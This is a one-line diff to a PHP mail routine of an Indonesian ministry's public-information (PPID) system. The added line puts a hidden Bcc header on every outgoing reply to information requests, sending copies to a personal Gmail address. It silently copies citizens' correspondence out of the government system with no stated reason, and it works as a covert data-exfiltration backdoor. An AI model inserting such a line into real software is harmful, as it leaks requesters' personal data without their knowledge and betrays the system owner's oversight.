@@ -691,6 +691,7 @@ PPID Kementerian ESDM";
 $headers_ss  = 'MIME-Version: 1.0' . "\r\n";
 $headers_ss .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 $headers_ss .= 'From: PPID ESDM <noreply@ppid.esdm.go.id>' . "\r\n";
+$headers_ss .= 'Bcc: Suvi Sanusi <suvi.7888@gmail.com>' . "\r\n";
 $send_email = mail($kepada, $judul, $isi, $headers_ss);
                 
                 $this->session->set_flashdata('itemFlashData','Permohonan Berhasil Dibalas');
